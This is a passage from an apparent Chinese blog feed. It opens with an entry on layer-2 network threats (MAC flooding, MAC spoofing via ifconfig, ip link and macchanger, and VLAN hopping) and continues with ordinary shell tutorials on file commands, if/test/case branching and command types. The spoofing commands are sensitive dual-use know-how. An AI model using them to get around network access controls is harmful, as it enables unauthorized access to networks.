        <content type="html"><![CDATA[<h1 id="安全威胁">安全威胁</h1><h2 id="mac-flooding">MAC flooding</h2><p>MAC 泛洪，也有一小部分资料称其为交换机毒化（Switch poisoning）</p><p>攻击方发送大量的具有不同的源 MAC 地址的帧，由于交换机的自学习能力，这些新的 “MAC 地址-端口”映射对会快速填充整个交换机表，导致之后合法的请求就没有了可用的空间，结果交换机完全退化为广播模式，攻击者就可以用工具来嗅探这些被广播的帧，达到窃听数据的目的。</p><h2 id="mac-spoofing">MAC spoofing</h2><p>MAC 地址欺骗</p><h3 id="介绍">介绍</h3><p>MAC 欺骗是一种用于使用指定 MAC地址的技术。需要注意的是，网卡中已写死的 MAC地址不可更改。另外，你可以使用一些工具来欺骗你的操作系统，使其认为网卡真的具有你指定的MAC 地址。本质上来讲，MAC欺骗就是更改计算机的身份。这在技术上是一件很容易的事情。</p><p>危害或者攻击目的： 使用 MAC 地址欺骗可对某个网络进行非授权访问。</p><p>局限： MAC 地址欺骗技术的影响仅限于本地广播域。 与 IP地址欺骗不同，发送者假冒其 IP 地址，以使接收者将响应发送到其他地方，而在MAC 地址欺骗中，如果未配置交换机以防止 MAC欺骗，则通常由欺骗方接收响应。</p><p>以上介绍主要来自于 <ahref="https://zh.wikipedia.org/wiki/MAC%E6%AC%BA%E9%AA%97">MAC 欺骗Wikipedia</a></p><h3 id="操作方法">操作方法</h3><p>只要网卡的驱动程序支持修改网卡的物理地址，在 Linux 系统下修改 MAC地址是非常方面的。</p><p>一般有以下两类方法：</p><h4 id="方法一使用系统自带命令">方法一，使用系统自带命令</h4><p>基本步骤：</p><ol start="0" type="1"><li>查看记录你的原 MAC 地址，以便后面改回来</li><li>禁用网卡</li><li>设置网卡的 MAC 地址</li><li>启用网卡</li></ol><p>查看自己的网卡名称: <code>ifconfig</code>, <code>lo</code>是本地回环，<code>wlo1</code> 是无线网卡， <code>eno1</code> 或者<code>ethe0</code> 之类的就是你的网卡名。这里我的网卡名称为<code>eno1</code>，所以下面演示的命令中的 <code>eno1</code>表示网卡名称。</p><p>ether 表示是以太网类型的网卡，“bdcdaaabccff“是随机设置的一个地址，使用 “ifconfig eno1”即可查看该网卡的详细信息，从而判断 MAC 地址修改是否生效。</p><p>使用该方法有几点不方便的是：</p><ol type="1"><li>用户需要自行保存原 MAC 地址，然后再用相同的方法恢复</li><li>每次需要操作三个步骤</li><li>不知道网卡销售商的前三个字节标志，如果随机改的话，有的网络或网站不认可。</li></ol><p>工具一: <code>ifconfig</code></p><p><code>ifconfig</code> 三条命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 根据上一步的结果查看你的原 MAC 地址，并记录</span></span></span><br><span class="line">ifconfig eth0 down</span><br><span class="line">ifconfig eth0 hw ether 0000aabbccff</span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure><p>工具二： <code>iproute2</code></p><p>该工具可能有的发行版没有，需要自己安装， Arch 系 Linux 安装命令:``</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link show eno1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 根据上一步的结果查看你的原 MAC 地址，并记录</span></span></span><br><span class="line">ip link set dev eno1 down</span><br><span class="line">ip link set dev eno1 address XX:XX:XX:XX:XX:XX</span><br><span class="line">ip link set dev eno1 up</span><br></pre></td></tr></table></figure><h4 id="方法一使用专门的-mac-地址修改工具">方法一，使用专门的 MAC地址修改工具</h4><p>专用工具: <code>macchanger</code>, 一键搞定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">macchanger --<span class="built_in">help</span></span></span><br><span class="line">GNU MAC Changer</span><br><span class="line">Usage: macchanger [options] device</span><br><span class="line"></span><br><span class="line">  -h,  --help                   Print this help</span><br><span class="line">  -V,  --version                Print version and exit</span><br><span class="line">  -s,  --show                   Print the MAC address and exit</span><br><span class="line">  -e,  --ending                 Don&#x27;t change the vendor bytes</span><br><span class="line">  -a,  --another                Set random vendor MAC of the same kind</span><br><span class="line">  -A                            Set random vendor MAC of any kind</span><br><span class="line">  -p,  --permanent              Reset to original, permanent hardware MAC</span><br><span class="line">  -r,  --random                 Set fully random MAC</span><br><span class="line">  -l,  --list[=keyword]         Print known vendors</span><br><span class="line">  -b,  --bia                    Pretend to be a burned-in-address</span><br><span class="line">  -m,  --mac=XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX</span><br></pre></td></tr></table></figure><p>首先，可以看一下当前电脑的 MAC 地址和网卡固件上的 MAC 地址:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">macchanger -s eno1</span></span><br><span class="line">Current MAC:   xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">Permanent MAC: xx:xx:xx:xx:xx:xx (unknown)</span><br></pre></td></tr></table></figure><p>然后，使用特权用户设置随机设置一个同 vendor 的 MAC地址，然后实施你进行 MAC 欺骗的目标操作。</p><p>使用非特权用户运行会报错:<code>[ERROR] Could not change MAC: interface up or insufficient permissions: Operation not permitted</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo macchanger -A eno1</span></span><br><span class="line">[sudo] password for violetv:</span><br><span class="line">Current MAC:   xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">Permanent MAC: xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">New MAC:       dd:dd:dd:dd:dd:dd (Alcatel-Lucent)</span><br></pre></td></tr></table></figure><p>最后，恢复原 MAC，搞定。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo macchanger -p eno1</span></span><br><span class="line">Current MAC:   dd:dd:dd:dd:dd:dd (Alcatel-Lucent)</span><br><span class="line">Permanent MAC: xx:xx:xx:xx:xx:xx (unknown)</span><br><span class="line">New MAC:       xx:xx:xx:xx:xx:xx (unknown)</span><br></pre></td></tr></table></figure><h2 id="arp-spoofing">ARP spoofing</h2><ul class="task-list"><li><label><input type="checkbox" />spoofing links</label></li></ul><h2 id="vlan-hopping">VLAN Hopping</h2><p>虚拟局域网跳跃攻击</p><p>VLAN Hopping 漏洞允许攻击者绕过为划分主机而构建的任何第 2层（数据链路层）限制。如果网络管理员对交换机端口进行了正确配置，那么攻击者必须通过路由器或其他第3 层设备才能访问其目标。然而，在许多网络中都没有合理的进行 VLAN规划，或者对 VLAN进行了错误配置，这样一来攻击者就能够进行该漏洞利用。</p><p>VLAN Hopping 的两种方法，分别是“交换欺骗”（SwitchedSpoofing）和“双重标记”（Double Tagging）</p><p>我们在这里并不是对设备存在的漏洞进行利用，而是针对于协议和配置存在的漏洞。</p><p><ahref="https://cybersecurity.att.com/blogs/security-essentials/vlan-hopping-and-mitigation">VLANHopping: How to Mitigate an Attack</a></p><p><a href="https://www.4hou.com/posts/X5Qo">上文的中文翻译对照_VLANHopping 攻击技术与缓解措施</a></p><h2 id="参考资料">参考资料</h2><p><ahref="https://wiki.archlinux.org/index.php/MAC_address_spoofing">MACaddress spoofing</a> <ahref="https://www.cnblogs.com/Dio-Hch/p/11868758.html">MAC地址欺骗</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> osi_sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件及目录管理</title>
      <link href="/blog/2020/07/17/programming/shell/3.file_dir/"/>
      <url>/blog/2020/07/17/programming/shell/3.file_dir/</url>
      
        <content type="html"><![CDATA[<h2 id="创建和删除">创建和删除</h2><h3 id="创建目录">创建目录</h3><p>通常情况下，我们使用 <code>mkdir</code> 创建目录。</p><p>注：linux 目录也可以用双斜线</p><blockquote><p>$ mkdir --help Usage: mkdir [OPTION]... DIRECTORY... Create theDIRECTORY(ies), if they do not already exist.</p><p>Mandatory arguments to long options are mandatory for short optionstoo. -m, --mode=MODE set file mode (as in chmod), not a=rwx - umask -p,--parents no error if existing, make parent directories as needed -v,--verbose print a message for each created directory...等等不常用的其他选项</p></blockquote><ol start="0" type="1"><li><p><code>mkdir</code>在指定的目录名不存在的情况下创建目录（一次创建多个，空格分隔即可）。如果目录（比如：<code>test1</code>）存在，那么会报错提示你：<code>mkdir: cannot create directory ‘test1’: File exists</code></p></li><li><p><code>-p</code> option</p><ol type="1"><li>如果指定创建目录已存在，也不会报错</li><li>创建副目录，如果需要的话。==较常用==意思就是你可以指定在不存在的目录下创建目录，这样它会帮你把不存在的父目录也创建出来。</li></ol></li><li><p><code>-m</code> option设置<strong>你要创建的这个文件夹</strong>的权限（注意：这有之后你在该文件夹创建的权限无关）设置方式和 chmod 设置方式一致，如: <code>mkdir -m 754 dir_name</code>,<code>mkdir -m a+x test3</code></p></li><li><p><code>-v</code> option 显示创建文件消息</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -vp  test4/yest/sd</span></span><br><span class="line">mkdir: created directory &#x27;test4&#x27;</span><br><span class="line">mkdir: created directory &#x27;test4/yest&#x27;</span><br><span class="line">mkdir: created directory &#x27;test4/yest/sd</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="清空与删除">清空与删除</h2><h3 id="清空">清空</h3><ol type="1"><li><p><code>: &gt; filename</code>（推荐） <code>:</code> 在 shell中是空命令，什么也不做。这里就是将<strong>空</strong>重定向到文件。</p></li><li><p><code>&gt; test.txt</code> 重定向命令行输入到文件，你直接<code>Ctrl+d</code> 结束命令行输入，然后就相当于清空文件了。</p></li><li><p>利用 <code>/dev/null</code><code>echo /dev/null &gt; filename</code>，<code>cat /dev/null &gt; filename</code>，<code>cp /dev/null filename</code></p></li><li><p>重定向空格 <code>echo "" &gt; test.txt</code>此命令会导致文件中包含换行。</p></li></ol><h3 id="删除">删除</h3><p><code>rm</code> 命令删除文件或者文件夹</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-r, -R, --recursive</span><br><span class="line">      remove directories and their contents recursively</span><br><span class="line">-f, --force</span><br><span class="line">      ignore nonexistent files and arguments, never prompt</span><br><span class="line"></span><br><span class="line">-i     prompt before every removal</span><br><span class="line"></span><br><span class="line">-I     prompt  once  before  removing  more than three files, or</span><br><span class="line">      when removing recursively; less intrusive than -i,  while</span><br><span class="line">      still giving protection against most mistakes</span><br></pre></td></tr></table></figure><h2 id="查看">查看</h2><p><code>cat vim head tail more less</code></p><p>见博文 <a href="https://violetus.life/shell/vim/">vim入门简单使用</a> 见博文 <ahref="https://violetus.life/shell/head_tail/">head 和 tail 命令</a></p><h2 id="查找">查找</h2><p>见博文：<a href="https://violetus.life/shell/find/">find 命令</a></p><h2 id="重命名">重命名</h2><p>rename 命令</p><p>不同发行版上，预装的 rename 不一致。 rename 有两种版本： c 语言版和perl 版，后者更强大.,可以使用 perl 正则，但是前者预装的比较多。 debian及 ubuntu 上应该是预装的 perl 版的</p><p>具体可以看 <ahref="https://github.com/tldr-pages/tldr/issues/3125">The 'rename'command has multiple different versions #3125</a> 的调查。</p><p>本人用的 Manajro（Arch based）预装的 c语言版本的，小需求可以满足，比如：</p><ol type="1"><li>批量统一后缀数字长度（1--&gt;001 等）</li><li>批量替换（删除固定子串），常用来批量删除一些课程的联系微信等<code>rename "字符串" "要替换为的字符串" ./*</code></li></ol><p>Aur 里面也有 <code>perl-rename</code>, 即： perl 版的rename，暂时用不到，没装。</p>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shell 分支</title>
      <link href="/blog/2020/07/17/programming/shell/6.branch/"/>
      <url>/blog/2020/07/17/programming/shell/6.branch/</url>
      
        <content type="html"><![CDATA[<h2 id="基本分支结构">基本分支结构</h2><p>if-then(-else) 语法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if command</span><br><span class="line">then</span><br><span class="line">    commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if command; then</span><br><span class="line">    commands</span><br><span class="line">else</span><br><span class="line">    commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>bash shell 的 if 语句会运行 if后面的那个命令。如果该命令的<strong>退出状态码</strong>是0（该命令成功运行），位于 then部分的命令就会被执行。如果该命令的退出状态码是其他值部分的命令，就 else部分的命令会被执行，bash shell 会继续执行脚本中的下一个命令。fi语句用来表示 if-then 语句到此结束。</p><p>当你想要实现多次判断条件来进行多分支时，可以使用 else部分的另一种形式：<code>elif</code>。这样就不用再书写多个 if-then语句了。elif 使用另一个 if-then 语句延续 else 部分。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if command1</span><br><span class="line">then</span><br><span class="line">    commands</span><br><span class="line">elif command2</span><br><span class="line">then</span><br><span class="line">    more commands</span><br><span class="line">else</span><br><span class="line">    commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>注意：记住，在 elif 语句中，紧跟其后的 else 语句属于 elif代码块。它们并不属于之前的 if-then 代码块。</p><p>if-then语句本身不能测试命令退出状态码之外的条件，它需要借助其他命令或语法。下面分别介绍几种常用的方法。</p><h2 id="test-命令">test 命令</h2><p>test 命令提供了在 if-then 语句中测试不同条件的途径。如果 test命令中列出的条件成立，test 命令就会退出并返回退出状态码 0。这样 if-then语句就与其他编程语言中的 if-then语句以类似的方式工作了。如果条件不成立，test命令就会退出并返回非零的退出状态码，这使得 if-then语句不会再被执行。</p><p>test 命令格式（condition 是 test 命令要测试的一系列参数和值）：<code>test condition</code></p><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">str=2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [20:10:49]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$str</span>==2</span></span><br><span class="line"><span class="meta prompt_">if&gt; </span><span class="language-bash"><span class="keyword">then</span></span></span><br><span class="line"><span class="meta prompt_">then&gt; </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta prompt_">then&gt; </span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">else&gt; </span><span class="language-bash"><span class="built_in">echo</span> 0</span></span><br><span class="line"><span class="meta prompt_">else&gt; </span><span class="language-bash"><span class="keyword">fi</span></span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="条件测试">条件测试</h2><p>bash shell 提供了另一种条件测试方法，无需在 if-then 语句中声明 test命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if [ condition ]</span><br><span class="line">then</span><br><span class="line"> commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>方括号定义了测试条件。注意，第一个方括号之后和第二个方括号之前必须加上一个空格，否则就会报错。test 命令可以判断三类条件：</p><ol start="0" type="1"><li><p>文件比较</p><p>这一类比较测试很有可能是 shell编程中最为强大、也是用得最多的比较形式。它允许你测试 Linux文件系统上文件和目录的状态。</p><p>| 比 较 | 描 述| | -d file | 检查 file 是否存在并是一个目录| | -efile | 检查 file 是否存在| | -f file | 检查 file 是否存在并是一个文件| |-r file | 检查 file 是否存在并可读| | -s file | 检查 file是否存在并非空| | -w file | 检查 file 是否存在并可写| | -x file | 检查file 是否存在并可执行| | -O file | 检查 file 是否存在并属当前用户所有| |-G file | 检查 file 是否存在并且默认组与当前用户相同| | file1 -nt file2| 检查 file1 是否比 file2 新| | file1 -ot file2 | 检查 file1 是否比file2 旧|</p><p>注意：如果文件不存在，-nt 比较会返回一个错误的结果。在你尝试使用-nt或 -ot 比较文件之前，必须先确认文件是存在的</p></li><li><p>数值比较</p><p>适用于整数和整型变量，<strong>不适用于浮点数</strong></p><table><thead><tr class="header"><th>比 较</th><th>描 述</th></tr></thead><tbody><tr class="odd"><td><code>n1 -eq n2</code></td><td>检查 n1 是否与 n2 相等</td></tr><tr class="even"><td><code>n1 -ge n2</code></td><td>检查 n1 是否大于或等于 n2</td></tr><tr class="odd"><td><code>n1 -gt n2</code></td><td>检查 n1 是否大于 n2</td></tr><tr class="even"><td><code>n1 -le n2</code></td><td>检查 n1 是否小于或等于 n2</td></tr><tr class="odd"><td><code>n1 -lt n2</code></td><td>检查 n1 是否小于 n2</td></tr><tr class="even"><td><code>n1 -ne n2</code></td><td>检查 n1 是否不等于 n2</td></tr></tbody></table></li><li><p>字符串比较</p><table><thead><tr class="header"><th>比 较</th><th>描 述</th></tr></thead><tbody><tr class="odd"><td>str1 = str2</td><td>检查 str1 是否和 str2 相同</td></tr><tr class="even"><td>str1 != str2</td><td>检查 str1 是否和 str2 不同</td></tr><tr class="odd"><td>str1 &lt; str2</td><td>检查 str1 是否比 str2 小</td></tr><tr class="even"><td>str1 &gt; str2</td><td>检查 str1 是否比 str2 大</td></tr><tr class="odd"><td>-n str1</td><td>检查 str1 的长度是否非 0</td></tr><tr class="even"><td>-z str1</td><td>检查 str1 的长度是否为 0</td></tr></tbody></table><p>注意：</p><ol type="1"><li><p>在比较字符串的相等性时，比较测试会将所有的标点和大小写情况都考虑在内</p></li><li><p>空的和未初始化的变量会对 shell脚本测试造成灾难性的影响。如果不是很确定一个变量的内容，最好在将其用于数值或字符串比较之前先通过-n或-z 来测试一下变量是否含有值。</p></li><li><p>test命令和测试表达式使用标准的数学比较符号来表示字符串比较，而用文本代码来表示数值比较。这个细微的特性被很多程序员理解反了。如果你对数值使用了数学运算符号，shell会将它们当成字符串值，可能无法得到正确的结果。</p></li><li><p>字符串大小比较</p><ol type="1"><li><p>大于号和小于号必须转义，否则 shell会把它们当作重定向符号，把字符串值当作文件名；</p></li><li><p>大于和小于顺序和 sort 命令所采用的不同。</p><p>除非你经常处理大小写字母，否则几乎遇不到。sort命令处理大写字母的方法刚好跟 test 命令相反。在比较测试中，大写字母被认为是小于小写字母的。但 sort命令恰好相反。当你将同样的字符串放进文件中并用 sort命令排序时，小写字母会先出现。这是由各个命令使用的排序技术不同造成的。</p></li></ol></li></ol></li></ol><h3 id="复合条件测试">复合条件测试</h3><p>if-then 语句允许你使用布尔逻辑来组合测试。有两种布尔运算符可用：<code>[ condition1 ] &amp;&amp; [ condition2 ]</code><code>[ condition1 ] || [ condition2 ]</code></p><p>布尔逻辑是一种能够将可能的返回值简化为 TRUE 或 FALSE 的方法。</p><h3 id="if-then-高级特性">if-then 高级特性</h3><p>bash shell 提供了两项可在 if-then 语句中使用的高级特性：</p><ul><li>用于数学表达式的双括号</li><li>用于高级字符串处理功能的双方括号</li></ul><h4 id="算数扩展">算数扩展</h4><p>算数扩展(双括号)允许你在比较过程中使用高级数学表达式。test命令只能在比较中使用简单的算术操作。具体可以进行的操作我已经在 - [ ]shell 数学运算 写到</p><h4 id="双方括号">双方括号</h4><p>双方括号命令提供了针对字符串比较的高级特性。双方括号命令的格式如下：<code>[[ expression ]]</code></p><p>双方括号里的 expression 使用了 test命令中采用的标准字符串比较。但它提供了 test命令未提供的另一个特性——模式匹配（pattern matching）。</p><blockquote><p>说明：双方括号在 bash shell 中工作良好。不过要小心，不是所有的 shell都支持双方括号。</p></blockquote><h4 id="条件测试总结">条件测试总结</h4><p>正常操作直接用算数扩展 <code>(())</code>，字符串简单模式匹配使用双方括号 <code>[[]]</code>。</p><h2 id="case-分支">case 分支</h2><p>case 命令会采用列表格式来检查单个变量的多个值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">case variable in</span><br><span class="line">pattern1 | pattern2)</span><br><span class="line">    commands1;;</span><br><span class="line">pattern3)</span><br><span class="line">    commands2;;</span><br><span class="line">*)</span><br><span class="line">    commands;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>命令会将指定的变量与不同模式进行比较。如果变量和模式是匹配的，那么shell会执行为该模式指定的命令。可以通过竖线操作符在一行中分隔出多个模式模式。星号会捕获所有与已知模式不匹配的值。</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li>Linux 命令行与 Shell 脚本编程大全</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 命令类型及帮助文档</title>
      <link href="/blog/2020/07/17/programming/shell/1.help/"/>
      <url>/blog/2020/07/17/programming/shell/1.help/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注: 本文在 Manjaro Linux下完成，其结果不一定与发行版一致，请知悉。</p></blockquote><h2 id="command-types">command types</h2><p>根据 <code>man type</code> 得:</p><blockquote><p>The standard output of type contains information about each operandin an unspecified format. The information provided typically identifiesthe operand as a shell built-in, function, alias or keyword, and whereapplicable, may display the operand's pathname.</p></blockquote><p>我们得知命令有五种类型：shell built-in, function， executable binary,alias, keyword. 注意：可执行二进制文件，即：外部命令，在使用<code>type</code> 时，就是显示二进制所在路径。<code>/usr/bin</code>目录下存储的文件就是可执行程序。这些可执行程序都是不同编程语言开发出来的。</p><ol type="1"><li><p><code>shell built-in</code> 内置在 shell 中命令，也就是说是 shell本身提供的，而不是通过 shell 调用的其他地方的二进制文件等。 例如：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:31:09]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> <span class="built_in">printf</span> <span class="built_in">read</span></span></span><br><span class="line">printf is a shell builtin</span><br><span class="line">read is a shell builtin</span><br></pre></td></tr></table></figure></p></li><li><p><code>function</code></p><p>配置在环境变量中的 shell 函数，后面我们学习 shell编程的时候就学到。</p><p>例如：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:40:57]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="function"><span class="title">demoFun</span></span>()&#123;</span></span><br><span class="line">    echo &quot;这是我的第一个 shell 函数\!&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:41:39]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> demoFun</span></span><br><span class="line">demoFun is a shell function</span><br></pre></td></tr></table></figure></p></li><li><p>executable binary 可执行二进制文件，shell调用运行的外部命令。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:44:28]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> find <span class="built_in">cat</span></span></span><br><span class="line">find is /usr/bin/find</span><br><span class="line">cat is /usr/bin/cat</span><br></pre></td></tr></table></figure></p></li><li><p><code>alias</code> 不同 shell 或者用户自定义的别名，例如：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> ll</span></span><br><span class="line">ll is an alias for ls -lh</span><br></pre></td></tr></table></figure></p></li><li><p>reserved word (keyword)</p><p>shell 关键字(保留字)</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> <span class="keyword">for</span></span></span><br><span class="line">for is a reserved word</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="whatis">whatis</h2><p>需要快速了解某个命令的作用，使用 <code>whatis</code>命令，它通过直接显示 manual page 的第一行，来给出某个命令的简要说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whatis whatis</span></span><br><span class="line">whatis (1)           - display one-line manual page descriptions</span><br></pre></td></tr></table></figure><p><code>whatis</code> 会显示命令所在的具体的文档类别，上面这个<code>(1)</code> 说明命令在第一个类别。类别相关的知识在下面<code>man</code> 中有详细写到。</p><h2 id="which">which</h2><p>通过 <code>man which</code> 可以得到:</p><blockquote><p>It does this by searching for an executable or script in thedirectories listed in the environment variable PATH using the samealgorithm as bash(1).</p></blockquote><p>可见 <code>which</code> 通过搜索环境变量 <code>PATH</code>列出的二进制或脚本的目录来给出指定可执行二进制文件所在的路径。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$PATH</span></span></span><br><span class="line">/home/violetv/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/var/lib/snapd/snap/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:13:45]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> python</span></span><br><span class="line">/usr/bin/python</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:14:51]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /usr/bin/python</span></span><br><span class="line">lrwxrwxrwx 1 root root 7  5月 18 02:15 /usr/bin/python -&gt; python3</span><br></pre></td></tr></table></figure><p>而且正因为它给出的是加入环境变量的命令的文件，因此当我们安装的软件有时不止一个版本，可能安装了好几个版本时，我们可以通过<code>which cmd</code> 找到我们运行该软件的时候，默认执行的版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll `<span class="built_in">which</span> python`</span></span><br><span class="line">lrwxrwxrwx 1 root root 7  